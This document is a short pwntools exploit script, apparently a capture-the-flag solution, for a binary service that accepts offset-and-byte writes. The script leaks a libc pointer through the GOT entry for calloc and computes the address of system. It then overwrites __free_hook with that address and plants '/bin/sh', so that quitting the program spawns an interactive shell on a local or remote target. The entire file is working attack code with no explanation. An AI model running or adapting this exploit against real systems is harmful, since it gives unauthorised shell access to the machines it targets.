#!/usr/bin/env python
from pwn import *
import sys
import time

if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])

def overwrite_addr(offset,val):
    r.recvuntil("> ")
    r.send("%d,%d,%c\n" % (0,offset,val))

def leak_addr(offset):
    r.recvuntil("> ")
    r.send("%d,%d,%c\n" % (0,offset,0))
    r.recvuntil("overwriting ")
    ch = r.recvn(1)
    r.recvuntil("!")
    return ch

def overwrite_free_hook(value):
    for i,c in enumerate(p64(value)):
        overwrite_addr(FREE_HOOK_OFFSET+i, c)

def leak_calloc_ptr():
    libc_ptr = 0

    for i in range(6):
        c = leak_addr(GOT_CALLOC_OFFSET+i)
        libc_ptr += u8(c)<< i*8

    return libc_ptr

# local libc
#FREE_HOOK_OFFSET = -0x11a868
#GOT_CALLOC_OFFSET = -0x11cfa8
#LIBC_SYSTEM_OFFSET = 0x25b1a

# remote libc
FREE_HOOK_OFFSET = -0x122868
GOT_CALLOC_OFFSET = -0x124fa8
LIBC_SYSTEM_OFFSET = 0x25b1a

r.recvuntil("How big? ")
r.send("1024 x 1024\n")
libc_ptr = leak_calloc_ptr()
log.success("calloc: 0x%x" % libc_ptr)
system_ptr = libc_ptr + LIBC_SYSTEM_OFFSET
log.success("system: 0x%x" % system_ptr)

overwrite_free_hook(system_ptr)
for i,c in enumerate("/bin/sh\0"):
    overwrite_addr(i,c)

log.success("payload sent")
r.send("quit\n")
r.recvuntil("Bye!\n")
r.interactive()
